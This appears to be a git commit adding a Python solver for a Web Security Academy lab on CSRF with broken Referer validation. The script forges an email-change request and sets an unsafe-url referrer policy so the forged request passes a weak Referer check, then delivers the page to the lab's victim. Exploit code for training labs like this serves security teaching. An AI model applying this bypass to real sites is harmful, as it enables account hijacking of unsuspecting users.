61cfd362b2c99b790c2bd119b34771e8c6ef5b26
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-03-18 12:20:40 -0700

    CSRF with broken Referer validation

---
+++ web_security_academy/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken.py
@@ -0,0 +1,23 @@
+from web_security_academy.core.logger import logger
+from web_security_academy.core.utils import generate_csrf_html
+
+from urllib.parse import urljoin, urlparse
+from requests import Request
+
+
+def solve_lab(session):
+    req = Request(
+        "POST",
+        urljoin(session.url, "/my-account/change-email"),
+        data={"email": "user@example.com"},
+    )
+
+    exploit_server = session.exploit_server()
+    hostname = urlparse(session.url).hostname
+    headers = (
+        "HTTP/1.1 200 OK\r\n"
+        "Content-Type: text/html; charset=utf-8\r\n"
+        "Referrer-Policy: unsafe-url"
+    )
+    body = generate_csrf_html(req)
+    exploit_server.deliver_exploit_to_victim(f"/{hostname}", headers, body)
